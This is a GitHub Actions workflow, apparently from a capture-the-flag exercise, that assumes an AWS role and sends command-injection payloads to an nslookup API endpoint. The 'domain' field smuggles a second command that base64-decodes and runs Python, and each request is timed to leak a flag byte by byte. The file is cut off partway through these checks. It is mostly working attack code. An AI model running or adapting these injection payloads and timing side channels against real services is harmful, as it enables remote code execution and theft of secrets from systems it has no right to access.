name: recon

on:
  push:
    branches:
      - corgi
  workflow_dispatch:

permissions:
  id-token: write
  contents: write

jobs:
  recon:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout repo
        uses: actions/checkout@v4
        with:
          token: ${{ github.token }}

      - name: Configure AWS credentials via OIDC
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::009661764077:role/cicdRole
          aws-region: us-east-1

      - name: Verify flag and check each byte
        run: |
          B64_FULL=""
          B64_B0=""
          B64_B1=""
          B64_B2=""
          B64_B3=""
          B64_B4=""
          B64_B5=""
          B64_B6=""
          B64_B7=""
          B64_B8=""
          B64_B9=""
          B64_B10=""
          B64_B11=""
          B64_B12=""
          B64_B13=""
          B64_B14=""
          B64_B15=""

          touch verify.txt
          INJECT="x; echo $B64_FULL | base64 -d | python3 #"
          python3 -c "import json,sys; print(json.dumps({'domain': sys.argv[1]}))" "$INJECT" > payload.json
          START=$(date +%s%N); curl -s -o /dev/null -X POST https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup -H "Content-Type: application/json" -d @payload.json; END=$(date +%s%N)
          MS=$(( (END - START) / 1000000 ))
          echo "full_flag_check ${MS}ms" | tee -a verify.txt
          INJECT="x; echo $B64_B0 | base64 -d | python3 #"
          python3 -c "import json,sys; print(json.dumps({'domain': sys.argv[1]}))" "$INJECT" > payload.json
          START=$(date +%s%N); curl -s -o /dev/null -X POST https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup -H "Content-Type: application/json" -d @payload.json; END=$(date +%s%N)
